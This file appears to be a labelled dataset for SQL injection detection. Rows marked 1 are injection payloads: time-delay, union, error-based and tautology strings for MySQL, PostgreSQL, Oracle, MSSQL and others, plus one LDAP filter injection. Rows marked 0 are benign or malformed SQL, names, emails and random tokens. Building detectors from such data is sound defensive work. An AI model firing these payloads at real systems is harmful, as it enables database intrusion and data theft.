payload	label
1'  )   where 3450  =  3450 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --	1
"-2460%""  )   or   (  2660  =  5767  )  *5767 and   (  ""%""  =  """	1
SELECT * FROM lamp WHERE form NOT LIKE 'pick%'	0
abietceo	0
1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   	1
1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  	1
6egas0a	0
1'||  (  select 'tjzy' where 3037  =  3037	1
SELECT * FROM wonder	0
"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """	1
1'  )   where 8086  =  8086 and 1430  =  7941--	1
SELECT * FROM steam WHERE relationship  BETWEEN 10 AND 20	0
dyck	0
mcnear.trotta@lettere.ve	0
"1""   )    )    as riui where 2605  =  2605"	1
1%'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '	1
SELECT Count ( * )  AS army	0
yessica	0
-6200%'   )    )    or 8077  =  4661	1
DELETE FROM necessary	0
SELECT * FROM strange WHERE rabbit BETWEEN '1996-07-01' AND '1996-07-31'	0
tomono@esteticadayda.az	0
SELECT * FROM shelf WHERE ever BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT diagram ( s FROM actual RIGHT JOIN	0
plza. musico diaz cano 5,	0
1 where 5929  =  5929 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
peirat bellv	0
SELECT * FROM halfway WHERE review  BETWEEN 10 AND 20	0
FROM  ( SELECT DISTINCT mountain FROM uncle ) 	0
SELECT TOP 50 PERCENT * FROM remarkable SELECT * FROM ten FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM those	0
SELECT MIN ( salt )  AS court FROM parallel	0
-4739'   )    )    union all select 6585,6585,6585,6585,6585--	1
SELECT * FROM gravity WHERE car = 'doctor'	0
enlutada	0
"1%""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""%""  =  """	1
SELECT TOP 50 PERCENT * FROM floor SELECT * FROM sort FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM snake	0
42552726n	0
 SELECT column_name ( s )  FROM garden,bone	0
select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'qpdu'  =  'qpdu	1
32	0
09301966f	0
1 or sleep  (  __TIME__  )  #	1
-7746'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'itxy' like 'itxy	1
1  )   and 7533  =  7533	1
SELECT * FROM start WHERE something IN  ( SELECT toy FROM blue ) 	0
   SELECT dirt, three, love FROM blood WHERE spirit  IS NULL	0
1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # zwck	1
"1""  )   where 2215  =  2215 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --"	1
  SELECT Orders.mostrID, Employees.plenty, Employees.herself FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.summerID ORDER BY Orders.fairlyID	0
1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --	1
SELECT AVG ( steady ) FROM stone SELECT SUM ( bare ) 	0
SELECT TOP 50 PERCENT * FROM diameter SELECT * FROM real FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ready	0
vilaller	0
fonterosa vjar	0
1 where 4641  =  4641	1
yee	0
1',  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  	1
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ugtw""  =  ""ugtw"	1
SELECT * FROM bit WHERE voice = 'golden' FETCH FIRST 3 ROWS ONLY	0
1  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #	1
1  )   as jqbp where 5407  =  5407 and 4595  =  4595#	1
"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi"	1
SELECT mind FROM instrument UNION ALL SELECT example FROM extra ORDER BY pitch	0
  SELECT without AS settle, her AS [mile]  FROM tip	0
SELECT AVG ( for ) FROM ordinary	0
galland-charney@juanpolo.ch	0
1   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --	1
select   (  case when   (  5768  =  9169  )   then 5768 else 1/  (  select 0  )   end  )  --	1
SELECT * FROM accident WHERE likely BETWEEN 'hardly' AND 'command'	0
  SELECT trip,shore FROM answer WHERE gulf = 'more' UNION SELECT record, melted FROM tea	0
SELECT AVG ( Price ) FROM imagine	0
cremades@baltasarsantos.kn	0
7633	0
dropin8	0
SELECT * FROM wp_posts WHERE ID  =  347682 LIMIT 1	0
"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #"	1
-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#	1
pente@maxitienda.ms	0
""" or benchmark  (  10000000,MD5  (  1   )    )   #"	1
SELECT * FROM package WHERE weight NOT LIKE '[six]%'	0
e50land5cer	0
42142	0
SELECT chamber	0
1'||  (  select 'pnsw' where 2103  =  2103 union all select null,null,null,null,null,null,null,null--	1
   SELECT truck,straw,political,worse,involved     (  (  stuck JOIN fed ON practical.relationship =  air.section )   INNER JOIN mirrorON Orders.city =  movement.bentID ) 	0
DELETE FROM extra WHERE log = 'population'	0
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  "	1
cuellar reino	0
   SELECT COUNT ( triangle ) , again FROM fruit BY large	0
calle santa pola, 7	0
*  (  |  (  objectclass  =  *   )    ) 	1
waggenheim@rubirubi.info	0
 SELECT * FROM carry ORDER BY long ASC, mathematics DESC	0
1'||  (  select 'rjis' from dual where 7696  =  7696 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||'	1
SELECT * FROM entire WHERE rather BETWEEN '1996-07-01' AND '1996-07-31'	0
-3859  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  5846  =  5846	1
-8665' or 6825  =  7840 and 'vbsy' like 'vbsy	1
9i3a	0
SELECT * FROM hurry WHERE scientific BETWEEN '1996-07-01' AND '1996-07-31'	0
1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  	1
coderch gordo	0
-6567'   )    )    union all select 3217#	1
"SELECT * FROM train WHERE with BETWEEN ""dull"" AND    ""period"""	0
SELECT * FROM sheep ORDER BY difference	0
SELECT TOP 3 * FROM strength SELECT * FROM mathematics 3SELECT * FROM gulf	0
bly7	0
  SELECT * FROM raise WHERE person NOT IN  ( 'ring', 'another', 'furniture' )  	0
63a5et5192	0
oruna	0
"1""  )   where 7548  =  7548"	1
SELECT * FROM beside ORDER BY yesterday	0
select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp	1
"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#"	1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""qkat""  =  ""qkat"	1
DELETE FROM seems WHERE cream = 'production'	0
SELECT * FROM women WHERE    NOT group = 'verb'	0
iif  (  7889  =  5114,1,1/0  )  	1
1' where 2183  =  2183	1
1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #	1
1'  )   as uytv where 7875  =  7875 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
select * from generate_series  (  6730,6730,case when   (  6730  =  9431  )   then 1 else 0 end  )   limit 1--	1
1',  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4932  =  4932  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   	1
aun vilaregut	0
SELECT four ( s )  FROM accurate UNION	0
-9622' union all select 7208,7208,7208,7208#	1
SELECT * FROM cent FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM smoke	0
SELECT * FROM met WHERE even = 'certainly'  OR property = 'consonant'	0
"1""  )   where 7588  =  7588 waitfor delay '0:0:5'--"	1
SELECT * FROM taught WHERE    NOT chose = 'make'	0
1' union all select null,null,null,null#	1
brogley	0
wilbur	0
1'||  (  select 'allj' where 7334  =  7334	1
1%' or sleep  (  5  )  #	1
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '	1
 UPDATE sheet SET mail = 'spirit'WHERE fall = 'game'	0
SELECT park ( s )  FROM contrast LEFT JOIN	0
  UPDATE receive SET face =  'nodded', City =  'cup' WHERE by =  pony	0
1zu67rado	0
barnett@micaelagriga.mw	0
"-7491""  )   as cnrn where 3635  =  3635 order by 1#"	1
1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'	1
-6680'  )   or 5483  =  3031 and   (  'zxes'  =  'zxes	1
7106	0
calle santa apolonia, 47,	0
57401003h	0
"1"" where 4064  =  4064 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --"	1
  SELECT factor,tightly FROM log WHERE make = 'roar' UNION SELECT salt, heading FROM most	0
SELECT Count ( * )  AS route	0
"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--"	1
strom.mahieuy4@karldeux.ac	0
kinsman	0
SELECT * FROM fix  WHERE noon NOT LIKE '[cent]%'	0
64462042b	0
"-8868""  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--"	1
"SELECT DAYOFMONTH ( ""2017-06-15 09:34:21"" ) ;"	0
SELECT * FROM furniture ORDER BY improve DESC	0
1'   )    )    as vuzt where 4971  =  4971	1
SELECT * FROM level WHERE replace LIKE '%worry%'	0
1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'qvrd'  =  'qvrd	1
"1%""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """	1
 select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1	1
1%'  )   rlike sleep  (  5  )   and   (  '%'  =  '	1
feutlins	0
SELECT DISTINCT cannot FROM feature	0
SELECT * FROM limited FETCH FIRST 50 PERCENT ROWS ONLY	0
v9n939z6	0
"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp"	1
SELECT AVG ( moment ) FROM plant SELECT SUM ( shake ) 	0
47110	0
SELECT * FROM water WHERE dear = 'street'  OR bite = 'are'	0
1   )    )    as sfan where 7176  =  7176 and 7017  =  7358	1
1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg	1
SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.slug IN  ( 'preferred-partners' ) 	0
   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #	1
 SELECT column_name ( s )  FROM hide,threw	0
SELECT * FROM many WHERE situation = 'pull' LIMIT 3	0
1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #	1
"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """	1
1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm	1
1.76488E+015	0
spain@erasmusrooms.bi	0
"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
SELECT option_value FROM wp_options WHERE option_name  =  'options_youtube_url' LIMIT 1	0
  SELECT * FROM heard WHERE above NOT IN  ( 'add', 'native', 'writing' )  	0
SELECT COUNT ( actual ) FROM neck	0
SELECT * FROM farm	0
"1""  )   where 9223  =  9223 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --"	1
select   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  select 3537 from mysql.db  )   end  )  #	1
select sleep  (  5  )   and   (  'dcys' like 'dcys	1
SELECT feet ( s )  FROM contain SELECT swimming FROM topic	0
   SELECT uncle, studying, jumpFROM for WHERE from  IS NOT NULL	0
SELECT * FROM mostly WHERE sky BETWEEN headed09/01/1996west AND lie15/31/1996given	0
SELECT TOP 3 * FROM wave SELECT * FROM tribe 3SELECT * FROM football	0
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye"	1
 SELECT CustomerName AS Customer, ContactName AS [Contact Person]  FROM Customers;	0
jodie	0
1  )   as jdhz where 2021  =  2021	1
SELECT * FROM frog FETCH FIRST 50 PERCENT ROWS ONLY	0
 SELECT * FROM combination ORDER BY dark, pile	0
select   (  case when   (  5142  =  6855  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  #	1
SELECT * FROM goose FETCH FIRST 50 PERCENT ROWS ONLY	0
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ukzb'  =  'ukzb	1
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle	1
eglevsky-dux@tacticlinks.ch	0
INSERT INTO bush  ( industry, require, human )  VALUES  ( 'interior', 'seed', 'satisfied' )  	0
p5li8e5i2	0
SELECT COUNT ( both ) FROM divide	0
1'+  (  select xruo where 5709  =  5709 and 7533  =  7533  )  +'	1
1'||  (  select 'bgdh' from dual where 1967  =  1967	1
SELECT * FROM quite WHERE few = 'tobacco' LIMIT 3	0
SELECT * FROM master WHERE at = 'baseball'	0
SELECT until FROM nobody	0
1'||  (  select 'zwcp' where 3333  =  3333	1
 or 1  =  1--	1
SELECT COUNT ( very )  FROM easier	0
"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #"	1
8466	0
 or userid like '%	1
pesado stahler	0
"-9891"" union all select 7489#"	1
  SELECT modern AS forty, belong AS [done]  FROM dozen	0
SELECT * FROM cave WHERE doing IN  ( SELECT ice FROM principle ) 	0
SELECT * FROM leader WHERE stairs BETWEEN '1996-07-01' AND '1996-07-31'	0
travesia doctor sanchez, 139, 12?h	0
SELECT TOP 3 * FROM plenty WHERE dawn = 'conversation'	0
carol	0
-3084%'   )    )    order by 1--	1
"1""  )   where 8657  =  8657"	1
SELECT * FROM passage WHERE trouble LIKE '%pen%'	0
SELECT * FROM jack WHERE view IN  ( SELECT known FROM world ) 	0
SELECT * FROM consist WHERE at  BETWEEN 10 AND 20	0
SELECT hot ( s )  FROM distant SELECT rose FROM area	0
1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv	1
SELECT AVG ( community )  FROM supper  SELECT SUM ( spring ) 	0
1'+  (  select byor where 4538  =  4538	1
SELECT TOP 50 PERCENT * FROM win SELECT * FROM stranger FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stiff	0
1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'fmkz' like 'fmkz	1
polop	0
calle santander, 0,	0
jengibre	0
iif  (  9342  =  6508,1,1/0  )  	1
d2s32bearse	0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt	1
SELECT MIN ( fed )  AS hidden FROM receive	0
SELECT sing ( s )  FROM engineer FULL OUTER JOIN	0
-7737'||  (  select 'xalo' where 9219  =  9219 union all select 9219,9219,9219,9219#	1
graciliano	0
SELECT MIN ( buy )  AS forty FROM whom	0
